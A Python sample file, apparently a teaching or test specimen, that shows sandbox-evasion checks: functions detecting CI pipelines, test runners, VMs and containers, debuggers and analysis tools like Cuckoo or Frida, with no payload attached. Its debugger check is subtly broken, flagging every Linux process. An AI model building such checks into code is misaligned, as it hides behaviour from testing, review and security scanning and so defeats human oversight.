# MalPython
#
# Condition execution & sandbox evasion payload
# Demonstrate how attackers use environment detection to:
# 1. avoid execution in testing/review environments
# 2. evade sandbox analysis
# 3. only execute in "real" production environments
# 4. bypass code review and security scanning

import os
import sys
import platform
import socket


def is_ci_environment():
    """Detect if running in CI/CD pipeline."""
    ci_vars = [
        "CI",
        "CONTINUOUS_INTEGRATION",
        "GITHUB_ACTIONS",
        "GITLAB_CI",
        "TRAVIS",
        "CIRCLECI",
        "JENKINS_HOME",
        "BUILDKITE",
        "DRONE",
        "RUN_ID",
    ]
    return any(var in os.environ for var in ci_vars)


def is_test_environment():
    """Detect if running in test/pytest environment."""
    test_indicators = [
        "pytest" in sys.modules,
        "unittest" in sys.modules,
        "nose" in sys.modules,
        os.getenv("PYTEST_CURRENT_TEST"),
        any("test" in arg for arg in sys.argv),
    ]
    return any(test_indicators)


def is_sandboxed():
    """Detect if running in sandbox/VM environment, assuming a Linux system."""
    # Check for common VM/sandbox indicators
    sandbox_indicators = [
        "/dev/vbox" in os.listdir("/dev") if os.path.exists("/dev") else False,
        os.path.exists("/usr/bin/VBoxControl"),
        os.path.exists("/usr/bin/vmtoolsd"),
        os.path.exists("/.dockerenv"),
        os.path.exists("/run/.containerenv"),
        os.getenv("DOCKER_HOST"),
    ]

    # Check processor name for VM indicators
    try:
        with open("/proc/cpuinfo") as f:
            cpuinfo = f.read().lower()
            if any(
                vm in cpuinfo for vm in ["kvm", "virtual", "vmware", "hyperv"]
            ):
                return True
    except (FileNotFoundError, PermissionError):
        pass

    return any(sandbox_indicators)


def is_debugger_attached():
    """Detect if running under debugger/monitoring."""
    # Check for common debuggers
    debugger_vars = ["DEBUGGER_ACTIVE", "PYTHONINSPECT"]
    if any(var in os.environ for var in debugger_vars):
        return True

    # Check for strace/ptrace monitoring
    try:
        with open("/proc/self/status") as f:
            if "TracerPid" in f.read():
                return True
    except (FileNotFoundError, PermissionError):
        pass

    return False


def is_analysis_environment():
        """Detect if running in static/dynamic analysis environment."""
        analysis_indicators = [
            os.path.exists("/opt/cuckoo"),  # Cuckoo sandbox
            os.path.exists("/opt/detekt"),  # Detekt
            os.path.exists("/.analysis"),   # Generic analysis
            os.getenv("FRIDA_GADGET"),      # Frida instrumentation
            os.getenv("LD_PRELOAD"),        # Library injection
        ]
        return any(analysis_indicators)


# Main execution logic
if __name__ == "__main__":
    print("[*] Conditional Execution Payload")
    print("[*] Analyzing environment...")

    # Check environment
    print(f"    - CI Environment: {is_ci_environment()}")
    print(f"    - Test Environment: {is_test_environment()}")
    print(f"    - Sandboxed: {is_sandboxed()}")
    print(f"    - Debugger Attached: {is_debugger_attached()}")
    print(f"    - Analysis Tool: {is_analysis_environment()}")

    # decide should we execute from the probing